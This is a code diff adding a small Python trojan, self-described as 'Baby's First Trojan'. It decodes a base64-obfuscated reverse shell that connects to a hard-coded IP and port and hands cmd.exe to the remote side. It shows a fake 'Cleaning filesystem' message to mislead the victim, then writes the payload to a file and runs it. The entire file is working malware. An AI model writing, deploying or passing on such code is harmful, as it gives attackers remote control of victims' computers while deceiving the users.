@@ -1,0 +1,20 @@
+#Baby's First Trojan - Written by darkwire with a lot of help from the internet.  Please don't be evil.  :D
+
+
+import base64
+from subprocess import check_output
+
+
+base64_message = 'aW1wb3J0IG9zLCBzb2NrZXQsIHN1YnByb2Nlc3MsIHRocmVhZGluZywgc3lzDQoNCmRlZiBzMnAocywgcCk6DQogICAgd2hpbGUgVHJ1ZTpwLnN0ZGluLndyaXRlKHMucmVjdigxMDI0KS5kZWNvZGUoKSk7IHAuc3RkaW4uZmx1c2goKQ0KDQpkZWYgcDJzKHMsIHApOg0KICAgIHdoaWxlIFRydWU6IHMuc2VuZChwLnN0ZG91dC5yZWFkKDEpLmVuY29kZSgpKQ0KDQpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCndoaWxlIFRydWU6DQogICAgdHJ5OiBzLmNvbm5lY3QoKCcxOTIuMTY4LjEwMC4xNTMnLCA5NTAxKSk7IGJyZWFrDQogICAgZXhjZXB0OiBwYXNzDQoNCnA9c3VicHJvY2Vzcy5Qb3BlbihbImNtZC5leGUiXSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VULCBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsIHNoZWxsPVRydWUsIHRleHQ9VHJ1ZSkNCg0KdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9czJwLCBhcmdzPVtzLHBdLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQ0KDQp0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1wMnMsIGFyZ3M9W3MscF0sIGRhZW1vbj1UcnVlKS5zdGFydCgpDQoNCnRyeTogcC53YWl0KCkNCmV4Y2VwdDogcy5jbG9zZSgpOyBzeXMuZXhpdCgwKQ0K'
+base64_bytes = base64_message.encode('ascii')
+message_bytes = base64.b64decode(base64_bytes)
+message = message_bytes.decode('ascii')
+
+print("Cleaning filesystem.  Please wait.  DO NOT close this window or shutdown your computer.")
+
+with open("Output.py", "w") as text_file:
+    print(message, file=text_file)
+
+
+#change this to switch operating systems
+check_output("python.exe Output.py", shell=True).decode()
